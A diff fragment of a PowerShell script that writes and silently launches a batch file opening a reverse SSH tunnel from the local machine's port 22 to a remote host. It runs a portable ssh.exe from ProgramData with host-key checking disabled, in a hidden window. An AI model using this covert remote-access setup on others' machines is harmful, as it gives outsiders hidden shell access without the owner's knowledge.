@@ -165,22 +165,21 @@ if %%ERRORLEVEL%% EQU 0 (
 
 
 # Save the batch file
-#Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
+Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 
 # Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
-#Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
+Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #Start-Process -FilePath "$batFilePath"
 
-$command = "`"C:\ProgramData\ssh_portable\ssh.exe`" -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -i `"$keyFile`" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host"
+# Try running the powershell command directly
+#$command = "`"C:\ProgramData\ssh_portable\ssh.exe`" -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -i `"$keyFile`" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host"
 
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = "powershell.exe"
-$psi.Arguments = "-Command $command"
-$psi.WindowStyle = 'Hidden'
-$psi.CreateNoWindow = $true
-$psi.UseShellExecute = $false
-
-[System.Diagnostics.Process]::Start($psi)
+#$psi = New-Object System.Diagnostics.ProcessStartInfo
+#$psi.FileName = "powershell.exe"
+#$psi.Arguments = "-Command $command"
+#$psi.WindowStyle = 'Hidden'
+#$psi.CreateNoWindow = $true
+#$psi.UseShellExecute = $false
 
 
 #$taskName = "ReverseSSHTunnel"
